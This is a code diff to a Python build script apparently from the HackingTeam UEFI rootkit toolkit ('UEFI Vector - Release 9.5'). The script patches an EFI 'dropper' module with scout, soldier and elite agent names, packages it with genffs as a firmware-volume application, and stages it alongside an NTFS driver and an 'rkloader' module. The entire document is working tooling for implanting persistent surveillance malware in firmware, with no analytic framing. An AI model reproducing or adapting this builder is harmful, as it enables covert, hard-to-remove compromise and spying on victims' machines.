@@ -22,6 +22,8 @@ INFO = 0
 WARNING = 1
 ERROR = 2
 
+documentation = "]HackingTeam[ UEFI Vector - Release 9.5"
+
 # Error routine
 def error(level, msg):
 	code = "ERROR"
@@ -104,79 +106,73 @@ class Insyde():
 	
 if __name__=='__main__':
 	
+	
 	print "Arguments in command line %d" %(len(sys.argv))
 	
 	for i in range(len(sys.argv)):
 		print "Param %d : %s" %(i, sys.argv[i])
 	
-	if len(sys.argv) != 7:
-		print "[ERROR] %s require 6 parameters"%(DESCRIPTION)
-		print "[-INFO] isflash.bin scout.exe scoutname soldiername elitename outputdir"
+	if len(sys.argv) != 6:
+		print "[ERROR] %s require 5 parameters"%(DESCRIPTION)
+		print "[-INFO] scout.exe scoutname soldiername elitename outputdir"
 		sys.exit(0)
 	
-	destfolder = sys.argv[6]
+	destfolder = sys.argv[5]
 	
 	if os.path.exists(destfolder) == False:
 		os.makedirs(destfolder)
-		
+	
 	bios = Insyde()
 	
-	size = bios.LoadIsFlash(sys.argv[1])
+	os.system("copy /y dropper.mod dropper.tmp")
+	print "Patching EFI Application"
+	bios.Patch("dropper.tmp", sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
+		
+	#error(INFO, "{0} supported.".format(sys.argv[1]))
+	#error(INFO, "{0} is {1} - FileName {2} ".format(sys.argv[1], bios.Architecture(), bios.RecoveryName() ) )
+	#os.system("copy /y x64file2.mod x64file2.tmp")
+	#os.system(" -o dropper -t EFI_FV_FILETYPE_APPLICATION -g eaea9aec-c9c1-46e2-9d52-432ad25a9b0b -s -a 1 -i dropper.tmp")
 	
-	if size == 0:
-		error(WARNING, "Unsupported firmware or invalid file.")
-		sys.exit(1)
-		
-	img = bios.ExractBiosImage(sys.argv[1], size)
+	p = subprocess.Popen(('genffs.exe', "-o", "dropper", "-t", "EFI_FV_FILETYPE_APPLICATION", "-g", "eaea9aec-c9c1-46e2-9d52-432ad25a9b0b", "-s", "-a", "1", "-i", "dropper.tmp"))
 	
-	fd = open(os.path.join(destfolder, "firmware"), "wb")
-	fd.write(bytearray(img))
+	p.wait()
+	#print "running uefiextract...."
 	
-	fd.close()
+	#p = subprocess.Popen(('UEFIextract.exe', os.path.join(destfolder, "firmware"), "x64file0.mod", "x64file1.mod", "dropper"))
 	
-	if bios.RecoveryInFD(os.path.join(destfolder, "firmware")) == False:
-		error(ERROR, "{0} not supported.".format(sys.argv[1]))
-		sys.exit(1)
+	#p.wait()
+
+	#print "copy /y %s firmware.fd"%(sys.argv[1])
 	
-	if (bios.Architecture() == "I386" or bios.Architecture() == "X64"):
-		#error(INFO, "{0} supported.".format(sys.argv[1]))
-		#error(INFO, "{0} is {1} - FileName {2} ".format(sys.argv[1], bios.Architecture(), bios.RecoveryName() ) )
-		os.system("copy /y x64file2.mod x64file2.tmp")
-		bios.Patch("x64file2.tmp", sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5])
-		os.system("genffs.exe -o dropper -t EFI_FV_FILETYPE_APPLICATION -g eaea9aec-c9c1-46e2-9d52-432ad25a9b0b -s -a 1 -i x64file2.tmp")
-		
-		print "running uefiextract...."
-		
-		p = subprocess.Popen(('UEFIextract.exe', os.path.join(destfolder, "firmware"), "x64file0.mod", "x64file1.mod", "dropper"))
-		
-		p.wait()
-  
-		print "copy /y %s firmware.fd"%(sys.argv[1])
-		
-		os.system("copy /y %s firmware.fd"%(sys.argv[1]))
-		bios.ReplaceBiosImage("firmware.fd", "new.fd", size)
-		# load new.fd into firmware
-		
-		# output file for console
-		outputfile = os.path.join(destfolder, bios.RecoveryName())
-		print "copy /y %s %s"%(sys.argv[1], outputfile)
-		
-		# output file!
-		os.system("copy /y %s %s"%("firmware.fd", outputfile))
-		
-		# clean area
-		os.remove("x64file2.tmp")
-		os.remove("dropper")
-		os.remove(os.path.join(destfolder, "firmware"))
-		os.remove("new.fd")
-		os.remove("firmware.fd")
-		
-		if os.path.exists(os.path.join(destfolder, "error")):
-			os.remove(os.path.join(destfolder, "error"))
-		
-	else:
-		error(WARNING, "No RECOVERY MODULE found.".format(sys.argv[1]))
-		sys.exit(1)
+	#os.system("copy /y %s firmware.fd"%(sys.argv[1]))
+	#bios.ReplaceBiosImage("firmware.fd", "new.fd", size)
+	# load new.fd into firmware
+	
+	# output file for console
+	#outputfile = os.path.join(destfolder, bios.RecoveryName())
+	#print "copy /y %s %s"%(sys.argv[1], outputfile)
+	
+	# transfer "fd" into output folder
+	p = subprocess.Popen(('unzip.exe', "-qq", "fd.zip", "-d", destfolder))
+	
+	p.wait()
+	
+	print "copy fs driver"
+	os.system("copy /y %s %s\\modules"%("ntfs.mod", destfolder))
+	print "copy rkloader"
+	os.system("copy /y %s %s\\modules"%("rkloader.mod", destfolder))
+	print "copy dropper"
+	os.system("copy /y dropper %s\\modules\\dropper.mod"%(destfolder))
+	
+	# clean area
+	#os.remove("x64file2.tmp")
+	os.remove("dropper")
+	os.remove("dropper.tmp")
+	#os.remove(os.path.join(destfolder, "firmware"))
+	#os.remove("new.fd")
+	#os.remove("firmware.fd")
+	
+	if os.path.exists(os.path.join(destfolder, "error")):
+		os.remove(os.path.join(destfolder, "error"))
 	
 	sys.exit(0)
-		
